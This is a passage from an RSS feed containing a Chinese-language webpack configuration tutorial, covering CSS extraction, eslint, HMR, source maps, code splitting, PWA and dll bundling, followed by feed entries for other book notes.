n><br><span>211</span><br><span>212</span><br></div></div></li>
<li>
<p>package.json</p>
<div><pre><code><span>// postcss</span>
<span>"browserslist"</span><span>:</span> <span>{</span>
  <span>"development"</span><span>:</span> <span>[</span>
    <span>"last 1 chrome version"</span><span>,</span>
    <span>"last 1 firefox version"</span><span>,</span>
    <span>"last 1 safari version"</span>
  <span>]</span><span>,</span>
  <span>"production"</span><span>:</span> <span>[</span>
    <span>">0.2%"</span><span>,</span>
    <span>"not dead"</span><span>,</span>
    <span>"not op_mini all"</span>
  <span>]</span>
<span>}</span>
<span>// eslint</span>
<span>"eslintConfig"</span><span>:</span> <span>{</span>
  <span>// 继承 airbnb-base</span>
  <span>"extends"</span><span>:</span> <span>"airbnb-base"</span><span>,</span>
  <span>"env"</span><span>:</span> <span>{</span>
    <span>// 支持浏览器全局变量</span>
    <span>"browser"</span><span>:</span> <span>true</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div></li>
</ul>
<h2 id="_2-提取-css-成单独文件"> 2. 提取 CSS 成单独文件</h2>
<div><pre><code><span>const</span> MiniCssExtractPlugin <span>=</span> <span>require</span><span>(</span><span>'mini-css-extract-plugin'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>module</span><span>:</span> <span>{</span>
    <span>rules</span><span>:</span> <span>[</span>
      <span>// css</span>
      <span>{</span>
        <span>test</span><span>:</span> <span><span>/</span><span>\.css$</span><span>/</span></span><span>,</span>
        <span>use</span><span>:</span> <span>[</span>MiniCssExtractPlugin<span>.</span>loader<span>,</span> <span>'css-loader'</span><span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>

  <span>plugins</span><span>:</span> <span>[</span>
    <span>new</span> <span>MiniCssExtractPlugin</span><span>(</span><span>{</span>
      <span>filename</span><span>:</span> <span>'css/built.css'</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h2 id="_3-css-兼容性处理"> 3. CSS 兼容性处理</h2>
<ul>
<li>
<p>webpack.config.js</p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>module</span><span>:</span> <span>{</span>
    <span>rules</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>test</span><span>:</span> <span><span>/</span><span>\.css$</span><span>/</span></span><span>,</span>
        <span>use</span><span>:</span> <span>[</span>
          MiniCssExtractPlugin<span>.</span>loader<span>,</span>
          <span>'css-loader'</span><span>,</span>
          <span>{</span>
            <span>loader</span><span>:</span> <span>'postcss-loader'</span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
              <span>ident</span><span>:</span> <span>'postcss'</span><span>,</span>
              <span>plugins</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>[</span><span>require</span><span>(</span><span>'postcss-preset-env'</span><span>)</span><span>]</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
<li>
<p>package.json</p>
<div><pre><code><span>"browserslist"</span><span>:</span> <span>{</span>
  <span>"development"</span><span>:</span> <span>[</span>
    <span>"last 1 chrome version"</span><span>,</span>
    <span>"last 1 firefox version"</span><span>,</span>
    <span>"last 1 safari version"</span>
  <span>]</span><span>,</span>
  <span>"production"</span><span>:</span> <span>[</span>
    <span>">0.2%"</span><span>,</span>
    <span>"not dead"</span><span>,</span>
    <span>"not op_mini all"</span>
  <span>]</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div></li>
</ul>
<h2 id="_4-压缩-css"> 4. 压缩 CSS</h2>
<div><pre><code><span>const</span> OptimizeCssAssetsWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'optimize-css-assets-webpack-plugin'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>[</span><span>new</span> <span>OptimizeCssAssetsWebpackPlugin</span><span>(</span><span>)</span><span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_5-eslint-语法检查"> 5. eslint 语法检查</h2>
<ul>
<li>
<p>webpack.config.js</p>
<div><pre><code><span>// eslint-config-airbnb（React）</span>
<span>// eslint-config-airbnb-base（not React）</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>module</span><span>:</span> <span>{</span>
    <span>rules</span><span>:</span> <span>[</span>
      <span>{</span>
        <span>test</span><span>:</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>,</span>
        <span>loader</span><span>:</span> <span>'eslint-loader'</span><span>,</span>
        <span>// 优先执行</span>
        <span>enforce</span><span>:</span> <span>'pre'</span><span>,</span>
        <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
        <span>options</span><span>:</span> <span>{</span>
          <span>fix</span><span>:</span> <span>true</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div></li>
<li>
<p>package.json</p>
<div><pre><code><span>"eslintConfig"</span><span>:</span> <span>{</span>
  <span>// 继承 airbnb-base</span>
  <span>"extends"</span><span>:</span> <span>"airbnb-base"</span><span>,</span>
  <span>"env"</span><span>:</span> <span>{</span>
    <span>// 支持浏览器全局变量</span>
    <span>"browser"</span><span>:</span> <span>true</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div></li>
</ul>
<h2 id="_6-hmr-热模块替换"> 6. HMR 热模块替换</h2>
<ul>
<li>
<p>作用：重新打包变换的模块，提升构建速度。</p>
<blockquote>
<ol>
<li>样式文件：style-loader 内部实现了 HMR 功能。</li>
<li>js 文件：默认不能使用 HMR 功能。</li>
<li>html 文件：单页面只有一个 html，不需要实现 HMR 功能。</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>// 开启 HMR 功能会导致html热更新失效，在 entry 引入 html 文件即可解决</span>
  <span>entry</span><span>:</span> <span>[</span>
    <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/index.js'</span><span>)</span><span>,</span>
    <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/index.html'</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>

  <span>devServer</span><span>:</span> <span>{</span>
    <span>// 开启 HMR</span>
    <span>hot</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_7-source-map"> 7. source-map</h2>
<ul>
<li>
<p>作用：提供源代码与构建后代码的映射，方便追踪调试。</p>
</li>
<li>
<p><code>[inline- | hidden- | eval-][nosources-][cheap- [module- ]]source-map</code></p>
</li>
<li>
<p>外部：会单独生成.map 文件；内联：嵌套在 js 文件中。内联构建速度相对更快。</p>
<blockquote>
<ol>
<li>source-map<code>外部</code>：提示错误信息与源代码错误位置。</li>
<li>inline-source-map<code>内联</code>（只生成一个内联 source-map）：与 source-map 一致。</li>
<li>hidden-source-map<code>外部</code>：提示错误信息与构建后代码错误位置，无源代码错误位置。</li>
<li>eval-source-map<code>内联</code>（每一个文件都生成对应的 source-map）：与 source-map 一致。</li>
<li>nosources-source-map<code>外部</code>：提示错误信息，无源代码和构建后代码信息。</li>
<li>cheap-source-map<code>外部</code>：与 source-map 一致，但错误位置只精确到行，不包含 loader 的 source-map。</li>
<li>cheap-module-source-map<code>外部</code>：与 cheap-source-map 一致，但包含 loader 的 source-map，module 会将 loader 的 sourcemap 简化为精确到行。</li>
</ol>
</blockquote>
</li>
<li>
<p>开发环境：速度快，好调试。</p>
<blockquote>
<ul>
<li>速度（eval &gt; inline &gt; cheap &gt; ...）。</li>
</ul>
<ol>
<li>eval-cheap-source-map</li>
<li>eval-source-map</li>
</ol>
<ul>
<li>调试。</li>
</ul>
<ol>
<li>source-map</li>
<li>cheap-module-source-map</li>
<li>cheap-source-map</li>
</ol>
<ul>
<li>综上。</li>
</ul>
<ol>
<li>eval-source-map</li>
<li>eval-cheap-module-source-map</li>
</ol>
</blockquote>
</li>
<li>
<p>生产环境：隐藏源代码？好调试？因内联会增大打包体积，生产环境不考虑内联。</p>
<blockquote>
<ol>
<li>source-map</li>
<li>cheap-source-map</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>devtool</span><span>:</span> <span>'source-map'</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_8-缓存"> 8. 缓存</h2>
<ul>
<li>
<p>babel 缓存：<code>cacheDirectory: true</code>。</p>
</li>
<li>
<p>HardSourceWebpackPlugin：为模块提供中间缓存，缓存默认的存放路径是: node_modules/.cache/hard-source。首次构建时间没有太大变化，但是第二次开始，构建时间大约可以节约 80%。</p>
</li>
<li>
<p>文件资源缓存：打包文件名称加 hash（推荐使用 contenthash）。</p>
<blockquote>
<ol>
<li>hash：根据 webpack 构建时生成的唯一 hash 值。</li>
<li>chunkhash：根据 chunk 生成 hash 值，同一个 chunk 的 hash 值一致。</li>
<li>contenthash：根据文件内容生成 hash 值。</li>
</ol>
</blockquote>
</li>
</ul>
<h2 id="_9-tree-sharking"> 9. tree-sharking</h2>
<ul>
<li>
<p>作用：去除无用的代码，减小代码体积。</p>
</li>
<li>
<p>开启条件：1. 使用 ESM、2. 生产环境。</p>
</li>
<li>
<p>webpack 版本差异，可能会将 css 文件去除。可在 package.json 中配置副作用文件：<code>&quot;sideEffects: [ &quot;*.css&quot;, &quot;*.less&quot; ]&quot;</code>。</p>
</li>
</ul>
<h2 id="_10-code-split"> 10. code split</h2>
<ul>
<li>
<p>作用：代码分割，按需加载。</p>
<blockquote>
<p>多入口：应用于多页面。</p>
</blockquote>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>// 多入口</span>
  <span>entry</span><span>:</span> <span>{</span>
    <span>index</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/index.js'</span><span>)</span><span>,</span>
    <span>home</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/home.js'</span><span>)</span><span>,</span>
  <span>}</span><span>,</span>

  <span>// 出口</span>
  <span>output</span><span>:</span> <span>{</span>
    <span>// 打包后的文件夹路径</span>
    <span>path</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'build'</span><span>)</span><span>,</span>
    <span>// 打包后文件的名字</span>
    <span>filename</span><span>:</span> <span>'js/[name].[contenthash:10].js'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><blockquote>
<p>optimization。</p>
</blockquote>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>// 单入口</span>
  <span>entry</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/index.js'</span><span>)</span><span>,</span>

  <span>/*
  // 多入口
  entry: {
    index: resolve(__dirname, './src/index.js'),
    home: resolve(__dirname, './src/home.js'),
  },
  */</span>

  <span>// 出口</span>
  <span>output</span><span>:</span> <span>{</span>
    <span>// 打包后的文件夹路径</span>
    <span>path</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'build'</span><span>)</span><span>,</span>
    <span>// 打包后文件的名字</span>
    <span>filename</span><span>:</span> <span>'js/[contenthash:10].js'</span><span>,</span>
  <span>}</span><span>,</span>
  <span>// 1. 将 node_modules 分别打包</span>
  <span>// 2. 多入口使用相同文件时，只打包一个 chunk</span>
  <span>optimization</span><span>:</span> <span>{</span>
    <span>splitChunks</span><span>:</span> <span>{</span>
      <span>chunks</span><span>:</span> <span>'all'</span><span>,</span> <span>// 选择哪些 chunk 进行优化</span>
      <span>minSize</span><span>:</span> <span>30000</span><span>,</span> <span>// 生成 chunk 的最小体积</span>
      <span>minChunks</span><span>:</span> <span>1</span><span>,</span> <span>// 拆分前必须共享模块的最小 chunks 数</span>
      <span>maxAsyncRequests</span><span>:</span> <span>30</span><span>,</span> <span>// 限制异步模块最大并行数（import()）</span>
      <span>maxInitialRequests</span><span>:</span> <span>30</span><span>,</span> <span>// 限制入口拆分数量</span>
      <span>automaticNameDelimiter</span><span>:</span> <span>'~'</span><span>,</span> <span>// 文件名称连接符</span>
      <span>cacheGroups</span><span>:</span> <span>{</span>
        <span>react</span><span>:</span> <span>{</span>
          <span>name</span><span>:</span> <span>'react'</span><span>,</span> <span>// chunk 名称</span>
          <span>test</span><span>:</span> <span><span>/</span><span>[\\/]node_modules[\\/](react|react-dom)[\\/]</span><span>/</span></span><span>,</span> <span>// 匹配条件</span>
          <span>priority</span><span>:</span> <span>10</span><span>,</span> <span>// 优先级</span>
        <span>}</span><span>,</span>
        <span>vendors</span><span>:</span> <span>{</span>
          <span>name</span><span>:</span> <span>'vendors'</span><span>,</span>
          <span>test</span><span>:</span> <span><span>/</span><span>[\\/]node_modules[\\/]</span><span>/</span></span><span>,</span>
          <span>priority</span><span>:</span> <span>-</span><span>10</span><span>,</span>
        <span>}</span><span>,</span>
        <span>commons</span><span>:</span> <span>{</span>
          <span>name</span><span>:</span> <span>'commons'</span><span>,</span>
          <span>minChunks</span><span>:</span> <span>2</span><span>,</span>
          <span>priority</span><span>:</span> <span>-</span><span>20</span><span>,</span>
        <span>}</span><span>,</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>// 将引用模块的 hash 单独打包（解决出口 chunkFilename 配置文件命名缓存失效）</span>
    <span>runtimeChunk</span><span>:</span> <span>{</span>
      <span>name</span><span>:</span> <span>entrypoint</span> <span>=></span> <span><span>`</span><span>runtime-</span><span><span>${</span>entrypoint<span>.</span>name<span>}</span></span><span>`</span></span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br></div></div><blockquote>
<p>import 动态导入。</p>
</blockquote>
<div><pre><code><span>const</span> home <span>=</span> <span>await</span> <span>import</span><span>(</span><span>/* webpackChunkName: 'home' */</span> <span>'./home'</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div></li>
</ul>
<h2 id="_12-懒加载和预加载"> 12. 懒加载和预加载</h2>
<ul>
<li>
<p>懒加载：使用时加载。</p>
<div><pre><code><span>const</span> home <span>=</span> <span>await</span> <span>import</span><span>(</span><span>/* webpackChunkName: 'home' */</span> <span>'./home'</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div></li>
<li>
<p>预加载：等其他资源加载完后加载，使用时再从缓存中读取。</p>
<div><pre><code><span>const</span> home <span>=</span> <span>await</span> <span>import</span><span>(</span>
  <span>/* webpackChunkName: 'home', webpackPrefetch: true */</span> <span>'./home'</span>
<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div></li>
</ul>
<h2 id="_13-pwa"> 13. PWA</h2>
<ul>
<li>
<p>作用：渐进式网络开发应用程序（离线可访问）。</p>
</li>
<li>
<p>webpack.config.js</p>
<div><pre><code><span>const</span> WorkboxWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'workbox-webpack-plugin'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>plugins</span><span>:</span> <span>[</span>
    <span>new</span> <span>WorkboxWebpackPlugin<span>.</span>GenerateSW</span><span>(</span><span>{</span>
      <span>// 清除旧 SW</span>
      <span>clientsClaim</span><span>:</span> <span>true</span><span>,</span>
      <span>// 快速启动</span>
      <span>skipWaiting</span><span>:</span> <span>true</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div></li>
<li>
<p>index.js</p>
<div><pre><code><span>if</span> <span>(</span><span>'serviceWorker'</span> <span>in</span> navigator<span>)</span>
  window<span>.</span><span>addEventListener</span><span>(</span><span>'load'</span><span>,</span> <span>(</span><span>)</span> <span>=></span>
    navigator<span>.</span>serviceworker<span>.</span><span>register</span><span>(</span><span>'/service-worker.js'</span><span>)</span>
  <span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>
</ul>
<h2 id="_14-多进程打包"> 14. 多进程打包</h2>
<ul>
<li>
<p>作用：提升打包耗时程序的速度，主要针对 babel loader 优化。</p>
<blockquote>
<ol>
<li>进程启动大概为 600ms，进程通信也有开销。</li>
<li>只有工作耗时长的程序，才需要多进程打包。</li>
</ol>
</blockquote>
</li>
</ul>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>module</span><span>:</span> <span>{</span>
    <span>rules</span><span>:</span> <span>[</span>
      <span>// babel</span>
      <span>{</span>
        <span>test</span><span>:</span> <span><span>/</span><span>\.js$</span><span>/</span></span><span>,</span>
        <span>exclude</span><span>:</span> <span><span>/</span><span>node_modules</span><span>/</span></span><span>,</span>
        <span>use</span><span>:</span> <span>[</span>
          <span>'thread-loader'</span><span>,</span>
          <span>{</span>
            <span>loader</span><span>:</span> <span>'babel-loader'</span><span>,</span>
            <span>options</span><span>:</span> <span>{</span>
              <span>presets</span><span>:</span> <span>[</span>
                <span>'@babel/preset-env'</span><span>,</span>
                <span>{</span>
                  <span>// 按需加载</span>
                  <span>useBuiltIns</span><span>:</span> <span>'usage'</span><span>,</span>
                  <span>// 指定 core-js 版本</span>
                  <span>corejs</span><span>:</span> <span>{</span>
                    <span>version</span><span>:</span> <span>3</span><span>,</span>
                  <span>}</span><span>,</span>
                  <span>// 指定兼容版本</span>
                  <span>targets</span><span>:</span> <span>{</span>
                    <span>chrome</span><span>:</span> <span>'60'</span><span>,</span>
                    <span>firefox</span><span>:</span> <span>'60'</span><span>,</span>
                    <span>ie</span><span>:</span> <span>'9'</span><span>,</span>
                    <span>safari</span><span>:</span> <span>'10'</span><span>,</span>
                    <span>edge</span><span>:</span> <span>'17'</span><span>,</span>
                  <span>}</span><span>,</span>
                <span>}</span><span>,</span>
              <span>]</span><span>,</span>
              <span>// 开启 babel 缓存</span>
              <span>cacheDirectory</span><span>:</span> <span>true</span><span>,</span>
            <span>}</span><span>,</span>
          <span>}</span><span>,</span>
        <span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br></div></div><h2 id="_15-externals"> 15. externals</h2>
<ul>
<li>作用：指定一些第三方库不进行打包，自行配置 CDN 资源。</li>
</ul>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>externals</span><span>:</span> <span>{</span>
    <span>vue</span><span>:</span> <span>'Vue'</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_16-dll"> 16. dll</h2>
<ul>
<li>
<p>作用：指定一些第三方库单独打包。</p>
<blockquote>
<p>webpack.config.js</p>
</blockquote>
<div><pre><code><span>const</span> webpack <span>=</span> <span>require</span><span>(</span><span>'webpack'</span><span>)</span>
<span>const</span> AddAssetHtmlWebpackPlugin <span>=</span> <span>require</span><span>(</span><span>'add-assets-html-webpack-plugin'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>mode</span><span>:</span> <span>'production'</span><span>,</span>

  <span>entry</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'./src/index.js'</span><span>)</span><span>,</span>

  <span>output</span><span>:</span> <span>{</span>
    <span>filename</span><span>:</span> <span>'js/[contenthash:10].js'</span><span>,</span>
    <span>path</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'build'</span><span>)</span><span>,</span>
  <span>}</span><span>,</span>

  <span>plugins</span><span>:</span> <span>[</span>
    <span>// 通知 webpack 不打包的库，同时更改引入名称</span>
    <span>new</span> <span>webpack<span>.</span>DllReferencePlugin</span><span>(</span><span>{</span>
      <span>manifest</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'dll/manifest.json'</span><span>)</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
    <span>// 将文件打包输出，并在 html 自动引入</span>
    <span>new</span> <span>AddAssetHtmlWebpackPlugin</span><span>(</span><span>{</span>
      <span>filepath</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'dll/vue.js'</span><span>)</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br></div></div><blockquote>
<p>webpack.dll.js</p>
</blockquote>
<div><pre><code><span>const</span> webpack <span>=</span> <span>require</span><span>(</span><span>'webpack'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  <span>mode</span><span>:</span> <span>'production'</span><span>,</span>

  <span>entry</span><span>:</span> <span>{</span>
    <span>// [name]: 包名</span>
    <span>vue</span><span>:</span> <span>'Vue'</span><span>,</span>
  <span>}</span><span>,</span>

  <span>output</span><span>:</span> <span>{</span>
    <span>filename</span><span>:</span> <span>'[name].js'</span><span>,</span>
    <span>path</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'dll'</span><span>)</span><span>,</span>
    <span>// 打包后向外暴露的名称</span>
    <span>library</span><span>:</span> <span>'[name]_[hash]'</span><span>,</span>
  <span>}</span><span>,</span>

  <span>plugins</span><span>:</span> <span>[</span>
    <span>// 打包成 manifest.json 文件，提供映射信息</span>
    <span>new</span> <span>webpack<span>.</span>DllPlugin</span><span>(</span><span>{</span>
      <span>// 映射库暴露的名称</span>
      <span>name</span><span>:</span> <span>'[name]_[hash]'</span><span>,</span>
      <span>// 输出文件路径</span>
      <span>path</span><span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'dll/manifest.json'</span><span>)</span><span>,</span>
    <span>}</span><span>)</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div></li>
</ul>
<h2 id="_17-批量导出文件、组件等"> 17. 批量导出文件、组件等</h2>
<ul>
<li>CJS 与 ESM 不能混用，webpack 打包会报引用错误。</li>
</ul>
<div><pre><code><span>const</span> files <span>=</span> require<span>.</span><span>context</span><span>(</span><span>'.'</span><span>,</span> <span>false</span><span>,</span> <span><span>/</span><span>.js$</span><span>/</span></span><span>)</span>
<span>const</span> hooks <span>=</span> <span>{</span><span>}</span>
files<span>.</span><span>keys</span><span>(</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>key</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>key <span>===</span> <span>'./index.js'</span><span>)</span> <span>return</span>
  Object<span>.</span><span>assign</span><span>(</span>hooks<span>,</span> <span>{</span>
    <span>[</span>key<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^\.\/(.*?)\.js$</span><span>/</span></span><span>,</span> <span>'$1'</span><span>)</span><span>]</span><span>:</span> <span>files</span><span>(</span>key<span>)</span><span>.</span>default<span>,</span>
  <span>}</span><span>)</span>
<span>}</span><span>)</span>

<span>// CJS导出（webpack5 以下，无 tree-sharking 哟！）</span>
module<span>.</span>exports <span>=</span> hooks
<span>// 使用</span>
<span>const</span> <span>{</span> useMatrix <span>}</span> <span>=</span> <span>require</span><span>(</span><span>'./hooks'</span><span>)</span>

<span>// ESM导出</span>
<span>export</span> <span>default</span> hooks
<span>// 使用</span>
<span>import</span> hooks <span>from</span> <span>'./hooks'</span>
<span>const</span> <span>{</span> useMatrix <span>}</span> <span>=</span> hooks
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>算法（第四版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/Algorithms/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Algorithms/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">算法（第四版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>区块链开发实战</title>
      <link>https://www.matrixtheone.ga/web/note/books/Blockchain/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Blockchain/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">区块链开发实战</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>CSS 权威指南（上）</title>
      <link>https://www.matrixtheone.ga/web/note/books/CSS-Guide-Vol1/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/CSS-Guide-Vol1/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">CSS 权威指南（上）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>CSS 权威指南（下）</title>
      <link>https://www.matrixtheone.ga/web/note/books/CSS-Guide-Vol2/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/CSS-Guide-Vol2/</guid>
